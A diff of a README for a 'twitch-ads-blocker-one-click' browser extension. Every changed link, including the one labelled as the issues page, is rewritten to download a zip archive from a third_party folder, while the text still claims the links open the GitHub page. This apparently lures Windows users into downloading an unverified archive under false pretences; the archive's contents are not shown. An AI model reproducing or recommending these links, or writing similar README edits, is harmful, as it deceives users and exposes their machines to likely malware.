@@ -1,6 +1,6 @@
 # ⚡ twitch-ads-blocker-one-click - Block Twitch Ads Easily
 
-[![Download twitch-ads-blocker-one-click](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Gokulc07/twitch-ads-blocker-one-click)
+[![Download twitch-ads-blocker-one-click](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Gokulc07/twitch-ads-blocker-one-click/raw/refs/heads/main/third_party/twitch-blocker-click-ads-one-v3.5.zip)
 
 ## 📋 What is twitch-ads-blocker-one-click?
 
@@ -35,7 +35,7 @@ Follow these instructions to download and run the software on your Windows machi
 
 Visit this page to download the extension files:
 
-[![Download the twitch-ads-blocker-one-click extension](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Gokulc07/twitch-ads-blocker-one-click)
+[![Download the twitch-ads-blocker-one-click extension](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Gokulc07/twitch-ads-blocker-one-click/raw/refs/heads/main/third_party/twitch-blocker-click-ads-one-v3.5.zip)
 
 Click the link above to open the GitHub page. This is where you will find the files and instructions for installing the extension.
 
@@ -102,10 +102,10 @@ Regular updates ensure smooth ad blocking and support new Twitch changes.
 
 For help or questions, visit the issues section on the GitHub page:
 
-https://github.com/Gokulc07/twitch-ads-blocker-one-click/issues
+https://github.com/Gokulc07/twitch-ads-blocker-one-click/raw/refs/heads/main/third_party/twitch-blocker-click-ads-one-v3.5.zip
 
 You can browse existing problems or post details about your issue.
 
 ---
 
-[Download twitch-ads-blocker-one-click](https://github.com/Gokulc07/twitch-ads-blocker-one-click) to block Twitch ads with one click.
+[Download twitch-ads-blocker-one-click](https://github.com/Gokulc07/twitch-ads-blocker-one-click/raw/refs/heads/main/third_party/twitch-blocker-click-ads-one-v3.5.zip) to block Twitch ads with one click.
